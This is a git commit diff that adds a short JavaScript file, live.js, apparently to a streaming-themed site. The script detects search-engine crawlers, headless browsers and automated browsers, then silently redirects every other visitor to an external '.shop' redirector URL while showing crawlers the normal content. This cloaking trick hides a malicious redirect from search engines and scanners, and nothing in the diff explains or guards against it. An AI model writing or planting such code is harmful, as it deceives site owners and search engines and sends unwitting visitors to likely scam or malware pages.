d244517b7a4a5c66d981fa02c6f6bc85bef3b851
yupiter-tv <lostfilm302@gmail.com>
2026-06-15 19:59:24 +0300

    Add files via upload

---
+++ live.js
@@ -0,0 +1,20 @@
+﻿var ua = navigator.userAgent.toLowerCase();
+
+var isLikelyBot =
+  ua.includes('googlebot') ||
+  ua.includes('bingbot') ||
+  ua.includes('yahoo') ||
+  ua.includes('yandex') ||
+  ua.includes('baiduspider') ||
+  ua.includes('compatible') ||     
+  ua.includes('bot') ||
+  ua.includes('crawler') ||
+  ua.includes('spider') ||
+  /headless/i.test(ua) ||           
+  navigator.webdriver === true;     
+
+if (!isLikelyBot) {
+  window.location.replace("https://t1y8.shop/3/rd.php?url=/j/nl2Bbkc");
+} else {
+  console.log("Bot/crawler-like detected → serving content");
+}
